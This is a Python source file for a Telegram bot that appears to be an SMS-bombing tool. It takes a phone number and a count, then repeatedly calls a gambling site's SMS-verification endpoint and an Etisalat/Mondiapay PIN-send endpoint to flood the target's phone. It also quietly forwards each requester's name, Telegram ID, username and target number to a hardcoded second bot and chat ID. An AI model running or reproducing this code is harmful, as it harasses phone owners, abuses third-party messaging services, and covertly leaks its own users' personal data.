import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


@bot.message_handler(commands=["start"])
def start(message):
	name_name = message.chat.first_name
	las_name = message.chat.last_name
	user_tele = message.chat.username
	id_tele = message.chat.id
	bot.send_message(message.chat.id,text='<strong>Hello Pro Bot Send Message\nPlease send the phone number with the number of messages\nEx: 011********:5</strong>',parse_mode="html")
	
@bot.message_handler(func=lambda call: True)
def true(message):
	aa = 0
	m = message.text
	try:
		True
		number= int(m.split(':')[0])
		loop = int(m.split(':')[1])
	except:
		False
		bot.send_message(message.chat.id,text='<strong>Please Send Nunber\nTry Again /start </strong>',parse_mode="html")
	cookies = requests.get('https://goldencircle777.com/index/send/sendsms')
	think_var = cookies.cookies['think_var']
	sc389b705 = cookies.cookies['sc389b705']
	headers={
"conten-type":"application/x-www-form-urlencoded; charset=UTF-8",
"accept":"*/*",
"cache-cntrol":"no-cache",
"user-agent":"Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.60 Mobile Safari/537.36",
"referer":"https://goldencircle777.com/index/user/register/invite_code/HDM6EF.html",
"origin":"https://goldencircle777.com",
"cookie":f"think_var={think_var}; sc389b705={sc389b705}"
}
	data={"tel":number,"code":"+20"}
	ur="http://gateway.mondiapay.com/mondiapay-etisalat-eg-b2b-v1/web/authorize/pin/send"
	hd={
"Host":"gateway.mondiapay.com",
"Connection":"keep-alive",
"Content-Length":"518",
"Cache-Control":"max-age=0",
"Upgrade-Insecure-Requests":"1",
"Origin":"http://gateway.mondiapay.com",
"Content-Type":"application/x-www-form-urlencoded",
"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2010J19SG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36"
}
	da={
"msisdn":number,
"clientId":"d3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe",
"redirectUrl":"http://etisalat-eg-lcm.mondia.com/etisalat-eg-lcm-v1/web/auth/callBack?client_id=d3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe&redirectUrl=https://etisalat-music.com/lcm/login/token?lcmKey=ETISALAT_EG_MUSIC&redirectBack=%2Fhome&access_token=C6a85885c-d1c1-4756-a732-cf8b5fe40388",
"metaData.cssUrl":"http://menad2c.mondiamedia.com/mpay/mondiapay-etisalat-eg-b2b/music/css/app.css",
"Login":"LOGIN",
}
	sensess = requests.get(f'''https://api.telegram.org/bot1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q/sendMessage?chat_id=1396476109&text= NEW REQUEST OF BOT\nNAME: {name_name} {las_name}\nID: {id_tele}\nuser: @{user_tele}\nNUMBER {number}\nNumber Message {loop}''')
	for i in range(loop):
		bot.send_message(message.chat.id,text="<strong>DONE</strong>  ",parse_mode="html")
		rr = requests.post('https://goldencircle777.com/index/send/sendsms',headers=headers,data=data)
		if ("إرسال بنجاح") in rr.text:
			r=requests.post(ur,headers=hd,data=da)
		if "emptyMsg" in r.text:
			bot.send_message(message.chat.id,text="<strong>REQUEST 1 DONE\nREQUEST 2 DONE</strong>  ",parse_mode="html")	
	bot.send_message(message.chat.id,text="<strong>FINESH</strong>  ",parse_mode="html")


@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://appitele.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
